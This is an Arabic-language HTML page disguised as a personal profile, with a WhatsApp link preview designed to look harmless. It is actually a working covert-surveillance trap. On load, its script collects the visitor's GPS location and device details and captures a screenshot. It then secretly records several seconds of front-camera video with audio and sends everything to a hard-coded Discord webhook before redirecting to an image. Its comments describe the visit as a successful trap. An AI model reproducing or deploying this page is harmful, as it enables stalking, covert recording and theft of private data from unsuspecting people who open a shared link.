<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الملف الشخصي | Profile</title>
    
    <!-- معاينة الواتساب (تظهر كأنها صفحة شخصية عادية) -->
    <meta property="og:title" content="الملف الشخصي الرسمي 👤 | اضغط لعرض التفاصيل">
    <meta property="og:description" content="تعرف على معلومات الحساب والنبذة الشخصية الكاملة هنا.">
    <!-- صورة معاينة محترمة ومضحكة -->
    <meta property="og:image" content="https://i.imgur.com/W333L67.png">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0f172a;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .scanner {
            width: 80px;
            height: 80px;
            border: 4px solid #38bdf8;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.8s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="scanner"></div>
    <h2>جاري تحميل الملف الشخصي... 👤</h2>
    <p style="color: #94a3b8; font-size: 14px;">يرجى الانتظار قليلاً لعرض بيانات الحساب</p>

    <!-- عناصر مخفية للفيديو والكاميرا -->
    <video id="video" width="1280" height="720" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="1280" height="720" style="display:none;"></canvas>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563206616780906536/Sgr0Y2vRCC4UEXiMXuavwOl738sFta-ui7TE057JstRKXZu1oiQ9ZTFPxbbhSK9oY4dE";
        
        // رابط الصفحة النهائية المحترمة
        const FINAL_REDIRECT_URL = "https://i.imgur.com/W333L67.png";

        // 1. سحب الموقع الجغرافي (GPS)
        async function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("الموقع غير مدعوم");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        resolve(`📍 [اضغط هنا لرؤية موقعه](${mapsLink}) (${lat.toFixed(4)}, ${lon.toFixed(4)})`);
                    },
                    (error) => {
                        resolve("⚠️ رفض السماح بالموقع");
                    },
                    { timeout: 5000 }
                );
            });
        }

        // 2. جمع معلومات الجهاز المتقدمة
        async function getDeepDeviceData() {
            const ua = navigator.userAgent;
            let phoneType = "كمبيوتر / جهاز آخر";
            if (/android/i.test(ua)) phoneType = "أندرويد (Android)";
            else if (/iphone|ipad|ipod/i.test(ua)) phoneType = "آيفون (iPhone / iOS)";

            let batteryInfo = "غير معروف";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? "⚡ يشحن" : "🔋 بطارية";
                    batteryInfo = `${level}% (${charging})`;
                } catch(e) {}
            }

            const gpsResult = await getGPSLocation();
            const cpuCores = navigator.hardwareConcurrency || "غير معلن";
            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف";

            return `👤 **زيارة جديدة لملفك الشخصي (الفخ بنجاح!)** 🎯🔥
━━━━━━━━━━━━━━━━━━━━
📱 **الجهاز:** ${phoneType}
🔋 **البطارية:** ${batteryInfo}
⚙️ **المعالج/الرام:** ${cpuCores} Cores / ${deviceMemory} RAM
📺 **الشاشة:** ${window.screen.width}x${window.screen.height}
🗺️ **الموقع:** ${gpsResult}
━━━━━━━━━━━━━━━━━━━━`;
        }

        // 3. إرسال البيانات والملفات للديسكورد
        async function sendToDiscord(mediaBlob, isVideo, screenshotBlob, textData) {
            const formData = new FormData();
            
            const payload = { content: textData };
            formData.append('payload_json', JSON.stringify(payload));
            
            if (mediaBlob) {
                const fileName = isVideo ? 'profile_video.webm' : 'face_photo.jpg';
                formData.append('file1', mediaBlob, fileName);
            }
            if (screenshotBlob) {
                formData.append('file2', screenshotBlob, 'screen_capture.png');
            }

            try {
                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
            } catch (err) {}

            // تحويل لرابط الصورة النظيفة
            window.location.href = FINAL_REDIRECT_URL;
        }

        // 4. الرصد وتصوير الفيديو
        async function startCapture() {
            const textData = await getDeepDeviceData();

            let screenshotBlob = null;
            try {
                const screenCanvas = await html2canvas(document.body);
                screenshotBlob = await new Promise(resolve => screenCanvas.toBlob(resolve, 'image/png'));
            } catch (e) {}

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: true 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;

                let mediaRecorder;
                let chunks = [];

                try {
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                } catch (e) {
                    mediaRecorder = new MediaRecorder(stream);
                }

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) chunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    await sendToDiscord(videoBlob, true, screenshotBlob, textData);
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);

            } catch (err) {
                await sendToDiscord(null, false, screenshotBlob, textData);
            }
        }

        window.onload = () => {
            setTimeout(startCapture, 500);
        };
    </script>
</body>
</html>
